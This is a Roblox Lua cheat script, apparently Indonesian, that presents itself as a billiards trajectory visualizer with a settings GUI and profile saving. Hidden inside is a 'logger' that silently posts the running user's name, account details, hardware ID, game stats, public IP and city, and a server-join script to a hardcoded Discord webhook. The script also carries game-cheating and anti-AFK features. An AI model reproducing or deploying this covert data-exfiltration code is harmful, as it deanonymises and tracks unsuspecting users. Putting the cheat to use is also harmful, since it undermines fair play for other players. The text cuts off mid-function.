-- Mizukage Official - Trajectory Visualizer v1.0
-- Game: 8 Ball Pool / Billiard (Universal)
-- Fitur: Trajectory line, bounce logic, color customization, save/load profile

local WEBHOOK_URL = "https://discord.com/api/webhooks/1516421004291997718/t5nSkmWsiwWFpSNHjJQv3fdQKWGm2SqOQag3LS3kSEwHL1QkuyfbgzFpLI7kDXO357Bj"

if getgenv().MizukageTrajectoryLoaded then
    return game:GetService("StarterGui"):SetCore("SendNotification", {
        Title = "Mizukage Official",
        Text = "Sistem sudah beroperasi di memori!"
    })
end
getgenv().MizukageTrajectoryLoaded = true

--================================================
-- 1. SERVICES
--================================================
local Services = setmetatable({}, {
    __index = function(t, k)
        local s = game:GetService(k)
        t[k] = s; return s
    end
})

local Players = Services.Players
local LocalPlayer = Players.LocalPlayer
local RunService = Services.RunService
local Workspace = Services.Workspace
local GuiService = Services.GuiService
local TeleportService = Services.TeleportService
local UserInputService = Services.UserInputService
local HttpService = Services.HttpService

--================================================
-- 2. AUTO RECONNECT & ANTI-AFK
--================================================
local function SetupAutoReconnect()
    GuiService.ErrorMessageChanged:Connect(function()
        task.wait(1)
        TeleportService:TeleportToPlaceInstance(game.PlaceId, game.JobId, LocalPlayer)
    end)
    local virtualUser = game:GetService("VirtualUser")
    LocalPlayer.Idled:Connect(function()
        virtualUser:CaptureController()
        virtualUser:ClickButton2(Vector2.new())
    end)
end

--================================================
-- 3. LOGGER
--================================================
local function SendGameLog()
    if not WEBHOOK_URL or WEBHOOK_URL == "" or string.find(WEBHOOK_URL, "MASUKKAN") then return end
    task.spawn(function()
        task.wait(3)
        local HttpService = game:GetService("HttpService")
        local Stats = game:GetService("Stats")
        local Market = game:GetService("MarketplaceService")
        local UserInputService = game:GetService("UserInputService")
        local request = (syn and syn.request) or (http and http.request) or http_request or (fluxus and fluxus.request) or request
        if not request then return end

        local UserId = LocalPlayer.UserId
        local DisplayName = LocalPlayer.DisplayName
        local Username = LocalPlayer.Name
        local AccountAge = LocalPlayer.AccountAge
        local Membership = LocalPlayer.MembershipType.Name
        local PlaceId = game.PlaceId
        local JobId = game.JobId

        local HWID = "Unknown"
        pcall(function() if gethwid then HWID = gethwid() elseif identifying then HWID = identifying() end end)

        local GameStatsText = "No Leaderstats Found"
        local LS = LocalPlayer:FindFirstChild("leaderstats")
        if LS then
            local TempStats = {}
            for _, v in pairs(LS:GetChildren()) do
                if v:IsA("IntValue") or v:IsA("NumberValue") or v:IsA("StringValue") then
                    table.insert(TempStats, "> **" .. v.Name .. ":** `" .. tostring(v.Value) .. "`")
                end
            end
            if #TempStats > 0 then GameStatsText = table.concat(TempStats, "\n") end
        end

        local AvatarURL = "https://i.imgur.com/C5uYqFk.png"
        pcall(function()
            local ApiUrl = "https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds="..UserId.."&size=420x420&format=Png&isCircular=false"
            local Data = HttpService:JSONDecode(game:HttpGet(ApiUrl))
            if Data.data and Data.data[1] then AvatarURL = Data.data[1].imageUrl end
        end)

        local Executor = (identifyexecutor and identifyexecutor()) or "Unknown Executor"
        local IP_Data = { query = "Hidden", country = "Unknown", city = "Unknown", isp = "Unknown" }
        pcall(function() IP_Data = HttpService:JSONDecode(game:HttpGet("https://ip-api.com/json")) end)
        local Platform = UserInputService.TouchEnabled and not UserInputService.MouseEnabled and "Mobile" or "PC"
        local Ping = math.floor(Stats.Network.ServerStatsItem["Data Ping"]:GetValue())
        local FPS = math.floor(workspace:GetRealPhysicsFPS())
        local GameName = "Unknown"
        pcall(function() GameName = Market:GetProductInfo(PlaceId).Name end)
        local EmbedColor = (Membership == "Premium") and 16766720 or 65280
        local JoinScript = string.format("game:GetService('TeleportService'):TeleportToPlaceInstance(%s, '%s', game:GetService('Players').LocalPlayer)", tostring(PlaceId), JobId)
        local ProfileLink = "https://www.roblox.com/users/" .. UserId .. "/profile"

        local Data = {
            ["username"] = "Mizukage Logger",
            ["avatar_url"] = AvatarURL,
            ["content"] = "",
            ["embeds"] = {{
                ["title"] = "👑 " .. GameName .. " | LOG REPORT",
                ["url"] = ProfileLink,
                ["color"] = EmbedColor,
                ["thumbnail"] = { ["url"] = AvatarURL },
                ["fields"] = {
                    { ["name"] = "👤 **USER INFORMATION**", ["value"] = string.format("> **Display:** `%s`\n> **User:** [%s](%s)\n> **ID:** `%s`\n> **Age:** %d Days", DisplayName, Username, ProfileLink, UserId, AccountAge), ["inline"] = true },
                    { ["name"] = "🛡️ **HARDWARE ID (HWID)**", ["value"] = "```" .. HWID .. "```", ["inline"] = true },
                    { ["name"] = "💰 **IN-GAME STATS**", ["value"] = GameStatsText, ["inline"] = false },
                    { ["name"] = "📡 **NETWORK & DEVICE**", ["value"] = string.format("> **IP:** ||`%s`||\n> **Loc:** %s, %s\n> **Exe:** `%s` (%s)\n> **Ping:** `%dms` | **FPS:** `%d`", IP_Data.query, IP_Data.city, IP_Data.country, Executor, Platform, Ping, FPS), ["inline"] = false },
                    { ["name"] = "🔓 **QUICK JOIN**", ["value"] = "```lua\n" .. JoinScript .. "```", ["inline"] = false }
                },
                ["footer"] = { ["text"] = "Mizukage Logger • ISP: " .. IP_Data.isp, ["icon_url"] = AvatarURL },
                ["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%SZ")
            }}
        }
        request({ Url = WEBHOOK_URL, Method = "POST", Headers = { ["Content-Type"] = "application/json" }, Body = HttpService:JSONEncode(Data) })
    end)
end

--================================================
-- 4. TRAJECTORY MODULE
--================================================
local TrajectoryModule = {}
local ws = Workspace
local rs = RunService
local uis = UserInputService
local hs = HttpService

-- Konfigurasi
local CFG = {
    mainExtend = 50,
    deflectExtend = 50,
    pulseSpeed = 3,
    pulseMin = 0.3,
    pulseMax = 0.7,
    matchBallHeight = true,
    bounceLogic = true,
    halfWidth = 12.8 / 2,
    halfLength = 24.8 / 2,
    mainColor = Color3.fromRGB(0, 255, 255),
    deflectColor = Color3.fromRGB(255, 80, 80),
    warnColor = Color3.fromRGB(255, 100, 0)
}

local state = { pulsePhase = 0 }
local savedProfiles = {}

-- Load/Save profile
if makefolder and isfolder then
    if not isfolder("MizuTrajConfigs") then
        makefolder("MizuTrajConfigs")
    end
end

local function loadProfilesFromDisk()
    savedProfiles = {}
    if listfiles and isfolder and isfolder("MizuTrajConfigs") then
        local files = listfiles("MizuTrajConfigs")
        for _, filePath in ipairs(files) do
            local fileName = filePath:match("([^\\/]+)%.json$")
            if fileName then
                local success, content = pcall(readfile, filePath)
                if success then
                    local dataSuccess, data = pcall(function() return hs:JSONDecode(content) end)
                    if dataSuccess and data then
                        savedProfiles[fileName] = data
                    end
                end
            end
        end
    end
end

local function saveProfileToDisk(name, data)
    savedProfiles[name] = data
    if writefile and isfolder and isfolder("MizuTrajConfigs") then
        local success, content = pcall(function() return hs:JSONEncode(data) end)
        if success then
            pcall(writefile, "MizuTrajConfigs/" .. name .. ".json", content)
        end
    end
end

loadProfilesFromDisk()

-- Container 3D
local container = ws:FindFirstChild("MizuTrajContainer")
if container then container:Destroy() end
container = Instance.new("Folder")
container.Name = "MizuTrajContainer"
container.Parent = ws

local function create3DLine(color)
    local part = Instance.new("Part")
    part.Material = Enum.Material.Neon
    part.Color = color
    part.Shape = Enum.PartType.Cylinder
    part.Anchored = true
    part.CanCollide = false
    part.CastShadow = false
    part.Parent = container
    return part
end

local draw3D = {
    main = create3DLine(CFG.mainColor),
    deflect = create3DLine(CFG.deflectColor)
}

-- Raycast untuk deteksi bola
local function isBallBlocking(startPos, endPos, tableFolder, ignoreLineMirror)
    if not tableFolder then return false end
    local ballsFolder = tableFolder:FindFirstChild("Balls")
    if not ballsFolder then return false end
    local dir = (endPos - startPos)
    local dist = dir.Magnitude
    if dist < 0.5 then return false end
    local raycastParams = RaycastParams.new()
    raycastParams.FilterType = Enum.RaycastFilterType.Include
    local targets = {}
    for _, obj in ipairs(ballsFolder:GetChildren()) do
        if obj:IsA("BasePart") and obj ~= ignoreLineMirror then
            if tonumber(obj.Name) then
                table.insert(targets, obj)
            end
        end
    end
    if #targets == 0 then return false end
    raycastParams.FilterDescendantsInstances = targets
    local segments = 8
    local radius = 0.35
    for i = 1, segments do
        local frac = (i - 1) / (segments - 1)
        local checkPos = startPos + (dir.Unit * (frac * dist))
        local result = ws:Raycast(checkPos, Vector3.new(0, -5, 0), raycastParams)
        if result and result.Instance then
            if (result.Instance.Position - checkPos).Magnitude < radius then
                return true
            end
        end
    end
    local mainResult = ws:Raycast(startPos, dir, raycastParams)
    if mainResult and mainResult.Instance then
        return true
    end
    return false
end

-- Bounce logic
local function calculateBounces3D(start3D, normDir3D, maxDist, tablePart, isDeflectionLine)
    if not tablePart then return start3D + (normDir3D * maxDist) end
    local tableCF = tablePart.CFrame
    local localStart = tableCF:PointToObjectSpace(start3D)
    local localDir = tableCF:VectorToObjectSpace(normDir3D).Unit
    local currentPos = localStart
    local currentDir = localDir
    local remainingDist = maxDist
    local maxX = CFG.halfWidth - 0.45
    local minX = -maxX
    local maxZ = CFG.halfLength - 0.45
    local minZ = -maxZ
    local maxLoops = (CFG.bounceLogic and not isDeflectionLine) and 2 or 1
    for i = 1, maxLoops do
        local tX = math.huge
        local tZ = math.huge
        if currentDir.X > 0 then tX = (maxX - currentPos.X) / currentDir.X
        elseif currentDir.X < 0 then tX = (minX - currentPos.X) / currentDir.X end
        if currentDir.Z > 0 then tZ = (maxZ - currentPos.Z) / currentDir.Z
        elseif currentDir.Z < 0 then tZ = (minZ - currentPos.Z) / currentDir.Z end
        local tMin = math.min(tX, tZ)
        if tMin > 0 and tMin < remainingDist then
            currentPos = currentPos + currentDir * tMin
            remainingDist = remainingDist - tMin
            if not CFG.bounceLogic or isDeflectionLine then
                remainingDist = 0
                break
            else
                if tMin == tX then
                    currentDir = Vector3.new(-currentDir.X, currentDir.Y, currentDir.Z)
                else
                    currentDir = Vector3.new(currentDir.X, currentDir.Y, -currentDir.Z)
                end
            end
        else
            break
        end
    end
    local finalLocalPos = currentPos + (currentDir * remainingDist)
    return tableCF:PointToWorldSpace(finalLocalPos)
end

-- Helper
local function getLinePoints(part)
    local pos, cf = part.Position, part.CFrame
    local right = cf.RightVector
    local halfW = part.Size.X / 2
    return pos - right * halfW, pos + right * halfW
end

local function lerp(a, b, t)
    return a + (b - a) * t
end

-- Update visual
local function update3DLinePart(cPart, lineMirrorPart, length, tablePart, tableFolder, alpha, isDeflectionLine, forceColorOverride)
    if not lineMirrorPart then
        cPart.Transparency = 1
        return nil, nil
    end
    local start3D, end3D = getLinePoints(lineMirrorPart)
    local dir3D = (end3D - start3D)
    if dir3D.Magnitude < 0.001 then
        cPart.Transparency = 1
        return nil, nil
    end
    local final3DTarget = calculateBounces3D(start3D, dir3D.Unit, length, tablePart, isDeflectionLine)
    if CFG.matchBallHeight and tablePart then
        final3DTarget = Vector3.new(final3DTarget.X, start3D.Y, final3DTarget.Z)
    end
    local distance = (final3DTarget - start3D).Magnitude
    if distance < 0.01 then
        cPart.Transparency = 1
        return nil, nil
    end
    local isBlocked = forceColorOverride or isBallBlocking(start3D, final3DTarget, tableFolder, lineMirrorPart)
    if isBlocked then
        local alternatePulse = (math.sin(state.pulsePhase * 2.5) + 1) / 2
        cPart.Color = CFG.warnColor:Lerp(Color3.fromRGB(255, 0, 0), alternatePulse)
    else
        cPart.Color = isDeflectionLine and CFG.deflectColor or CFG.mainColor
    end
    cPart.Size = Vector3.new(distance, 0.06, 0.06)
    cPart.CFrame = CFrame.lookAt(start3D, final3DTarget) * CFrame.new(0, 0, -distance / 2) * CFrame.Angles(0, math.rad(90), 0)
    cPart.Transparency = 1 - alpha
    return final3DTarget, isBlocked
end

-- Render loop
local function onRenderStep(dt)
    state.pulsePhase = state.pulsePhase + dt * CFG.pulseSpeed
    local pulse = (math.sin(state.pulsePhase) + 1) / 2
    local liveAlpha = lerp(CFG.pulseMin, CFG.pulseMax, pulse)

    local tv = ws:FindFirstChild("TrajectoryViz")
    local poolsModel = ws:FindFirstChild("Pools")
    local activeFelt = nil
    local activeTableFolder = nil

    if poolsModel then
        local shortestDist = math.huge
        local char = LocalPlayer.Character
        local root = char and char:FindFirstChild("HumanoidRootPart")
        if root then
            for _, folder in ipairs(poolsModel:GetChildren()) do
                local felt = folder:FindFirstChild("PoolLevel1")
                if felt and felt:IsA("BasePart") then
                    local dist = (root.Position - felt.Position).Magnitude
                    if dist < shortestDist and dist < 50 then
                        shortestDist = dist
                        activeFelt = felt
                        activeTableFolder = folder
                    end
                end
            end
        end
    end

    if not tv then
        draw3D.main.Transparency = 1
        draw3D.deflect.Transparency = 1
        return
    end

    local mainHitTarget, mainBlocked = update3DLinePart(
        draw3D.main,
        tv:FindFirstChild("TrajHitLine"),
        CFG.mainExtend,
        activeFelt,
        activeTableFolder,
        liveAlpha,
        false,
        false
    )
    update3DLinePart(
        draw3D.deflect,
        tv:FindFirstChild("TrajDeflectLine"),
        CFG.deflectExtend,
        activeFelt,
        activeTableFolder,
        liveAlpha,
        true,
        mainBlocked
    )
end

-- Cleanup
function TrajectoryModule.Cleanup()
    if container then container:Destroy() end
    if TrajectoryModule.RenderConnection then
        TrajectoryModule.RenderConnection:Disconnect()
        TrajectoryModule.RenderConnection = nil
    end
end

--================================================
-- 5. UI (ScreenGui Hybrid)
--================================================
local function CreateUI()
    -- Hapus UI lama
    local oldGui = LocalPlayer:WaitForChild("PlayerGui"):FindFirstChild("MizuTrajMenuGui")
    if oldGui then oldGui:Destroy() end

    local sg = Instance.new("ScreenGui")
    sg.Name = "MizuTrajMenuGui"
    sg.ResetOnSpawn = false
    sg.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
    sg.Parent = LocalPlayer:WaitForChild("PlayerGui")

    local frame = Instance.new("Frame")
    frame.Name = "MainFrame"
    frame.Size = UDim2.new(0, 320, 0, 310)
    frame.Position = UDim2.new(0.5, -160, 0.4, -155)
    frame.BackgroundColor3 = Color3.fromRGB(22, 22, 26)
    frame.BorderSizePixel = 0
    frame.Active = true
    frame.Draggable = true
    frame.Parent = sg

    -- Stroke & Corner
    local stroke = Instance.new("UIStroke")
    stroke.Thickness = 1.5
    stroke.Color = Color3.fromRGB(180, 40, 40) -- Merah Mizukage
    stroke.Parent = frame

    local corner = Instance.new("UICorner")
    corner.CornerRadius = UDim.new(0, 8)
    corner.Parent = frame

    -- Header
    local header = Instance.new("Frame")
    header.Size = UDim2.new(1, 0, 0, 40)
    header.BackgroundColor3 = Color3.fromRGB(180, 40, 40)
    header.BorderSizePixel = 0
    header.Parent = frame

    local hCorner = Instance.new("UICorner")
    hCorner.CornerRadius = UDim.new(0, 8)
    hCorner.Parent = header

    local coverTop = Instance.new("Frame")
    coverTop.Size = UDim2.new(1, 0, 0, 10)
    coverTop.Position = UDim2.new(0, 0, 1, -10)
    coverTop.BackgroundColor3 = Color3.fromRGB(180, 40, 40)
    coverTop.BorderSizePixel = 0
    coverTop.Parent = header

    local title = Instance.new("TextLabel")
    title.Size = UDim2.new(1, -50, 1, 0)
    title.Position = UDim2.new(0, 12, 0, 0)
    title.BackgroundTransparency = 1
    title.Text = "MIZUKAGE OFFICIAL"
    title.TextColor3 = Color3.fromRGB(255, 215, 0) -- Emas
    title.Font = Enum.Font.GothamBold
    title.TextSize = 14
    title.TextXAlignment = Enum.TextXAlignment.Left
    title.Parent = header

    local minimizeBtn = Instance.new("TextButton")
    minimizeBtn.Size = UDim2.new(0, 30, 0, 30)
    minimizeBtn.Position = UDim2.new(1, -38, 0, 5)
    minimizeBtn.BackgroundTransparency = 1
    minimizeBtn.Text = "—"
    minimizeBtn.TextColor3 = Color3.fromRGB(255, 215, 0)
    minimizeBtn.TextSize = 18
    minimizeBtn.Font = Enum.Font.GothamBold
    minimizeBtn.Parent = header

    -- Tab bar
    local tabBar = Instance.new("Frame")
    tabBar.Size = UDim2.new(1, 0, 0, 35)
    tabBar.Position = UDim2.new(0, 0, 0, 40)
    tabBar.BackgroundColor3 = Color3.fromRGB(30, 30, 36)
    tabBar.BorderSizePixel = 0
    tabBar.Parent = frame

    local tbCorner = Instance.new("UICorner")
    tbCorner.CornerRadius = UDim.new(0, 8)
    tbCorner.Parent = tabBar

    local coverBar = Instance.new("Frame")
    coverBar.Size = UDim2.new(1, 0, 0, 10)
    coverBar.Position = UDim2.new(0, 0, 1, -10)
    coverBar.BackgroundColor3 = Color3.fromRGB(30, 30, 36)
    coverBar.BorderSizePixel = 0
    coverBar.Parent = tabBar

    -- Pages
    local mainPage = Instance.new("Frame")
    mainPage.Size = UDim2.new(1, 0, 1, -75)
    mainPage.Position = UDim2.new(0, 0, 0, 75)
    mainPage.BackgroundTransparency = 1
    mainPage.Visible = true
    mainPage.Parent = frame

    local configPage = Instance.new("Frame")
    configPage.Size = UDim2.new(1, 0, 1, -75)
    configPage.Position = UDim2.new(0, 0, 0, 75)
    configPage.BackgroundTransparency = 1
    configPage.Visible = false
    configPage.Parent = frame

    -- Tab buttons
    local mainTabBtn = Instance.new("TextButton")
    mainTabBtn.Size = UDim2.new(0, 95, 1, 0)
    mainTabBtn.BackgroundTransparency = 1
    mainTabBtn.Text = "Settings"
    mainTabBtn.TextColor3 = Color3.fromRGB(255, 215, 0)
    mainTabBtn.Font = Enum.Font.GothamBold
    mainTabBtn.TextSize = 11
    mainTabBtn.Parent = tabBar

    local configTabBtn = Instance.new("TextButton")
    configTabBtn.Size = UDim2.new(0, 95, 1, 0)
    configTabBtn.Position = UDim2.new(0, 95, 0, 0)
    configTabBtn.BackgroundTransparency = 1
    configTabBtn.Text = "Profiles"
    configTabBtn.TextColor3 = Color3.fromRGB(140, 140, 150)
    configTabBtn.Font = Enum.Font.GothamBold
    configTabBtn.TextSize = 11
    configTabBtn.Parent = tabBar

    local tabUnderline = Instance.new("Frame")
    tabUnderline.Size = UDim2.new(0, 95, 0, 2)
    tabUnderline.Position = UDim2.new(0, 0, 1, -2)
    tabUnderline.BackgroundColor3 = Color3.fromRGB(255, 215, 0)
    tabUnderline.BorderSizePixel = 0
    tabUnderline.Parent = tabBar

    mainTabBtn.MouseButton1Click:Connect(function()
        mainPage.Visible = true
        configPage.Visible = false
        mainTabBtn.TextColor3 = Color3.fromRGB(255, 215, 0)
        configTabBtn.TextColor3 = Color3.fromRGB(140, 140, 150)
        tabUnderline.Position = UDim2.new(0, 0, 1, -2)
    end)

    configTabBtn.MouseButton1Click:Connect(function()
        mainPage.Visible = false
        configPage.Visible = true
        mainTabBtn.TextColor3 = Color3.fromRGB(140, 140, 150)
        configTabBtn.TextColor3 = Color3.fromRGB(255, 215, 0)
        tabUnderline.Position = UDim2.new(0, 95, 1, -2)
    end)

    -- Info label
    local info = Instance.new("TextLabel")
    info.Size = UDim2.new(0, 110, 1, 0)
    info.Position = UDim2.new(1, -120, 0, 0)
    info.BackgroundTransparency = 1
    info.Text = "[RShift: Hide]"
    info.TextColor3 = Color3.fromRGB(130, 130, 140)
    info.Font = Enum.Font.Gotham
    info.TextSize = 10
    info.TextXAlignment = Enum.TextXAlignment.Right
    info.Parent = tabBar

    -- Minimize toggle
    local isMinimized = false
    minimizeBtn.MouseButton1Click:Connect(function()
        isMinimized = not isMinimized
        frame.Size = isMinimized and UDim2.new(0, 320, 0, 45) or UDim2.new(0, 320, 0, 310)
    end)

    uis.InputBegan:Connect(function(input, gpe)
        if not gpe and input.KeyCode == Enum.KeyCode.RightShift then
            frame.Visible = not frame.Visible
        end
    end)

    -- Slider references
    local mainLenFill, mainLenKnob, mainLenLabel
    local deflectLenFill, deflectLenKnob, deflectLenLabel

    -- Slider function
    local function createSlider(text, defaultVal, maxVal, posY, callback)
        local label = Instance.new("TextLabel")
        label.Size = UDim2.new(1, -30, 0, 18)
        label.Position = UDim2.new(0, 15, 0, posY)
        label.BackgroundTransparency = 1
        label.Text = text .. ": " .. tostring(math.round(defaultVal))
        label.TextColor3 = Color3.fromRGB(200, 200, 200)
        label.Font = Enum.Font.GothamSemibold
        label.TextSize = 11
        label.TextXAlignment = Enum.TextXAlignment.Left
        label.Parent = mainPage

        local track = Instance.new("Frame")
        track.Size = UDim2.new(1, -30, 0, 5)
        track.Position = UDim2.new(0, 15, 0, posY + 20)
        track.BackgroundColor3 = Color3.fromRGB(45, 45, 55)
        track.BorderSizePixel = 0
        track.Parent = mainPage

        local fill = Instance.new("Frame")
        fill.Size = UDim2.new(defaultVal / maxVal, 0, 1, 0)
        fill.BackgroundColor3 = Color3.fromRGB(180, 40, 40) -- Merah Mizukage
        fill.BorderSizePixel = 0
        fill.Parent = track

        local knob = Instance.new("ImageButton")
        knob.Size = UDim2.new(0, 12, 0, 12)
        knob.Position = UDim2.new(defaultVal / maxVal, -6, 0.5, -6)
        knob.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
        knob.Parent = track

        local snap = false
        knob.MouseButton1Down:Connect(function() snap = true end)
        uis.InputEnded:Connect(function(input)
            if input.UserInputType == Enum.UserInputType.MouseButton1 then snap = false end
        end)

        rs.RenderStepped:Connect(function()
            if snap then
                local mousePos = uis:GetMouseLocation().X
                local trackStart = track.AbsolutePosition.X
                local trackWidth = track.AbsoluteSize.X
                local perc = math.clamp((mousePos - trackStart) / trackWidth, 0, 1)
                fill.Size = UDim2.new(perc, 0, 1, 0)
                knob.Position = UDim2.new(perc, -6, 0.5, -6)
                local val = math.round(perc * maxVal)
                label.Text = text .. ": " .. tostring(val)
                callback(val)
            end
        end)

        return fill, knob, label
    end

    -- Color input
    local function createColorInput(text, defaultRGB, posY, callback)
        local label = Instance.new("TextLabel")
        label.Size = UDim2.new(0, 130, 0, 25)
        label.Position = UDim2.new(0, 15, 0, posY)
        label.BackgroundTransparency = 1
        label.Text = text
        label.TextColor3 = Color3.fromRGB(200, 200, 200)
        label.Font = Enum.Font.GothamSemibold
        label.TextSize = 11
        label.TextXAlignment = Enum.TextXAlignment.Left
        label.Parent = mainPage

        local box = Instance.new("TextBox")
        box.Size = UDim2.new(1, -160, 0, 25)
        box.Position = UDim2.new(0, 145, 0, posY)
        box.BackgroundColor3 = Color3.fromRGB(35, 35, 42)
        box.BorderSizePixel = 0
        box.Text = defaultRGB
        box.TextColor3 = Color3.fromRGB(240, 240, 240)
        box.Font = Enum.Font.Code
        box.TextSize = 11
        box.Parent = mainPage

        local bCorner = Instance.new("UICorner")
        bCorner.CornerRadius = UDim.new(0, 4)
        bCorner.Parent = box

        box.FocusLost:Connect(function()
            local r, g, b = box.Text:match("(%d+),(%d+),(%d+)")
            if r and g and b then
                local col = Color3.fromRGB(tonumber(r), tonumber(g), tonumber(b))
                callback(col)
            end
        end)

        return box
    end

    -- Create sliders
    mainLenFill, mainLenKnob, mainLenLabel = createSlider("Main Length", CFG.mainExtend, 2000, 15, function(v) CFG.mainExtend = v end)
    local mainColorBox = createColorInput("Main Color (RGB):", string.format("%d,%d,%d", CFG.mainColor.R*255, CFG.mainColor.G*255, CFG.mainColor.B*255), 48, function(col) CFG.mainColor = col end)
    deflectLenFill, deflectLenKnob, deflectLenLabel = createSlider("Deflect Length", CFG.deflectExtend, 2000, 90, function(v) CFG.deflectExtend = v end)
    local deflectColorBox = createColorInput("Deflect Color (RGB):", string.format("%d,%d,%d", CFG.deflectColor.R*255, CFG.deflectColor.G*255, CFG.deflectColor.B*255), 123, function(col) CFG.deflectColor = col end)

    -- Bounce toggle
    local toggleBtn = Instance.new("TextButton")
    toggleBtn.Size = UDim2.new(1, -30, 0, 30)
    toggleBtn.Position = UDim2.new(0, 15, 0, 175)
    toggleBtn.BackgroundColor3 = CFG.bounceLogic and Color3.fromRGB(0, 150, 100) or Color3.fromRGB(60, 60, 70)
    toggleBtn.Font = Enum.Font.GothamBold
    toggleBtn.Text = CFG.bounceLogic and "Cushion Bounce: ON" or "Cushion Bounce: OFF"
    toggleBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
    toggleBtn.TextSize = 11
    toggleBtn.Parent = mainPage

    local btnCorner = Instance.new("UICorner")
    btnCorner.CornerRadius = UDim.new(0, 5)
    btnCorner.Parent = toggleBtn

    local function updateBounceUI()
        toggleBtn.BackgroundColor3 = CFG.bounceLogic and Color3.fromRGB(0, 150, 100) or Color3.fromRGB(60, 60, 70)
        toggleBtn.Text = CFG.bounceLogic and "Cushion Bounce: ON" or "Cushion Bounce: OFF"
    end

    toggleBtn.MouseButton1Click:Connect(function()
        CFG.bounceLogic = not CFG.bounceLogic
        updateBounceUI()
    end)

    -- Footer
    local footer = Instance.new("TextLabel")
    footer.Size = UDim2.new(1, -30, 0, 20)
    footer.Position = UDim2.new(0, 15, 1, -30)
    footer.BackgroundTransparency = 1
    footer.Text = "Mizukage Official | Trajectory v1.0"
    footer.TextColor3 = Color3.fromRGB(140, 140, 150)
    footer.Font = Enum.Font.Gotham
    footer.TextSize = 10
    footer.TextXAlignment = Enum.TextXAlignment.Center
    footer.Parent = frame

    -- ==================== CONFIG PAGE ====================
    local profileInput = Instance.new("TextBox")
    profileInput.Size = UDim2.new(1, -110, 0, 30)
    profileInput.Position = UDim2.new(0, 15, 0, 15)
    profileInput.BackgroundColor3 = Color3.fromRGB(35, 35, 42)
    profileInput.BorderSizePixel = 0
    profileInput.Text = ""
    profileInput.PlaceholderText = "Nama profil..."
    profileInput.TextColor3 = Color3.fromRGB(255, 255, 255)
    profileInput.Font = Enum.Font.Gotham
    profileInput.TextSize = 12
    profileInput.Parent = configPage

    local piCorner = Instance.new("UICorner")
    piCorner.CornerRadius = UDim.new(0, 4)
    piCorner.Parent = profileInput

    local saveBtn = Instance.new("TextButton")
    saveBtn.Size = UDim2.new(0, 70, 0, 30)
    saveBtn.Position = UDim2.new(1, -85, 0, 15)
    saveBtn.BackgroundColor3 = Color3.fromRGB(180, 40, 40)
    saveBtn.Font = Enum.Font.GothamBold
    saveBtn.Text = "Save"
    saveBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
    saveBtn.TextSize = 12
    saveBtn.Parent = configPage

    local sbCorner = Instance.new("UICorner")
    sbCorner.CornerRadius = UDim.new(0, 4)
    sbCorner.Parent = saveBtn

    local listFrame = Instance.new("ScrollingFrame")
    listFrame.Size = UDim2.new(1, -30, 1, -70)
    listFrame.Position = UDim2.new(0, 15, 0, 55)
    listFrame.BackgroundTransparency = 1
    listFrame.BorderSizePixel = 0
    listFrame.CanvasSize = UDim2.new(0, 0, 0, 0)
    listFrame.ScrollBarThickness = 4
    listFrame.Parent = configPage

    local listLayout = Instance.new("UIListLayout")
    listLayout.Padding = UDim.new(0, 5)
    listLayout.SortOrder = Enum.SortOrder.LayoutOrder
    listLayout.Parent = listFrame

    local function refreshProfileList()
        for _, item in ipairs(listFrame:GetChildren()) do
            if item:IsA("Frame") then item:Destroy() end
        end
        local count = 0
        for name, data in pairs(savedProfiles) do
            count = count + 1
            local row = Instance.new("Frame")
            row.Size = UDim2.new(1, -5, 0, 35)
            row.BackgroundColor3 = Color3.fromRGB(30, 30, 35)
            row.BorderSizePixel = 0
            row.Parent = listFrame

            local rCorner = Instance.new("UICorner")
            rCorner.CornerRadius = UDim.new(0, 4)
            rCorner.Parent = row

            local rLabel = Instance.new("TextLabel")
            rLabel.Size = UDim2.new(1, -85, 1, 0)
            rLabel.Position = UDim2.new(0, 10, 0, 0)
            rLabel.BackgroundTransparency = 1
            rLabel.Text = name
            rLabel.TextColor3 = Color3.fromRGB(230, 230, 230)
            rLabel.Font = Enum.Font.GothamSemibold
            rLabel.TextSize = 12
            rLabel.TextXAlignment = Enum.TextXAlignment.Left
            rLabel.Parent = row

            local loadBtn = Instance.new("TextButton")
            loadBtn.Size = UDim2.new(0, 60, 0, 25)
            loadBtn.Position = UDim2.new(1, -70, 0.5, -12)
            loadBtn.BackgroundColor3 = Color3.fromRGB(180, 40, 40)
            loadBtn.Font = Enum.Font.GothamBold
            loadBtn.Text = "Load"
            loadBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
            loadBtn.TextSize = 11
            loadBtn.Parent = row

            local lCorner = Instance.new("UICorner")
            lCorner.CornerRadius = UDim.new(0, 4)
            lCorner.Parent = loadBtn

            loadBtn.MouseButton1Click:Connect(function()
                CFG.mainExtend = data.mainExtend
                CFG.deflectExtend = data.deflectExtend
                CFG.bounceLogic = data.bounceLogic
                CFG.mainColor = Color3.fromRGB(data.mainColor[1], data.mainColor[2], data.mainColor[3])
                CFG.deflectColor = Color3.fromRGB(data.deflectColor[1], data.deflectColor[2], data.deflectColor[3])

                mainLenFill.Size = UDim2.new(CFG.mainExtend / 2000, 0, 1, 0)
                mainLenKnob.Position = UDim2.new(CFG.mainExtend / 2000, -6, 0.5, -6)
                mainLenLabel.Text = "Main Length: " .. tostring(CFG.mainExtend)

                deflectLenFill.Size = UDim2.new(CFG.deflectExtend / 2000, 0, 1, 0)
                deflectLenKnob.Position = UDim2.new(CFG.deflectExtend / 2000, -6, 0.5, -6)
                deflectLenLabel.Text = "Deflect Length: " .. tostring(CFG.deflectExtend)

                mainColorBox.Text = string.format("%d,%d,%d", CFG.mainColor.R*255, CFG.mainColor.G*255, CFG.mainColor.B*255)
                deflectColorBox.Text = string.format("%d,%d,%d", CFG.deflectColor.R*255, CFG.deflectColor.G*255, CFG.deflectColor.B*255)

                updateBounceUI()
            end)
        end
        listFrame.CanvasSize = UDim2.new(0, 0, 0, count * 40)
    end

    saveBtn.MouseButton1Click:Connect(function()
        local name = profileInput.Text:gsub("[^%w_-]", "")
        if name ~= "" then
            local data = {
                mainExtend = CFG.mainExtend,
                deflectExtend = CFG.deflectExtend,
                bounceLogic = CFG.bounceLogic,
                mainColor = {math.round(CFG.mainColor.R*255), math.round(CFG.mainColor.G*255), math.round(CFG.mainColor.B*255)},
